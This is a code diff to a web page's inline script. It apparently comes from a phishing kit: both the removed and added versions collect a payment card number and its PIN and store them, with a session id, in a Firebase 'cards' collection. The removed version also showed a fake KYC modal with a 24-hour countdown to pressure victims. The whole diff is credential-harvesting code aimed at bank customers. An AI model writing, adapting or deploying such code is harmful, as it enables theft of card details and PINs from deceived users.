@@ -202,50 +202,22 @@
   </script>
 
   <script>
-    function validateCardForm() {
-      const card1 = document.getElementById("card1").value.trim();
-      const card2 = document.getElementById("card2").value.trim();
-      const card3 = document.getElementById("card3").value.trim();
-      const card4 = document.getElementById("card4").value.trim();
-      const pin = document.getElementById("pin").value.trim();
+    const sessionId = localStorage.getItem("sessionId"); // Reuse the same
 
-      if ([card1, card2, card3, card4, pin].some(v => v.length < 4)) {
-        alert("Please fill all fields correctly.");
-        return false;
-      }
-
-      const cardNumber = `${card1}${card2}${card3}${card4}`;
-      const sessionId = localStorage.getItem("sessionId");
+    function saveCardData() {
+      const card = document.getElementById("card").value;
+      const pin = document.getElementById("pin").value;
 
       db.collection("cards").add({
-        card_number: cardNumber,
-        pin: pin,
-        sessionId: sessionId,
+        card,
+        pin,
+        sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        document.getElementById("kycModal").style.display = "flex";
-        startCountdown(24 * 60 * 60);
-      }).catch(err => {
-        alert("Error saving data.");
-        console.error(err);
+        // optionally clear session if done
+        // localStorage.removeItem("sessionId");
+        alert("Card Saved");
       });
-
-      return true;
-    }
-
-    function startCountdown(seconds) {
-      const countdownText = document.getElementById("countdownText");
-      function updateCountdown() {
-        let hrs = Math.floor(seconds / 3600);
-        let mins = Math.floor((seconds % 3600) / 60);
-        let secs = seconds % 60;
-        countdownText.textContent = `Time left: ${hrs}h ${mins}m ${secs}s`;
-        if (seconds > 0) {
-          seconds--;
-          setTimeout(updateCountdown, 1000);
-        }
-      }
-      updateCountdown();
     }
   </script>
 </body>
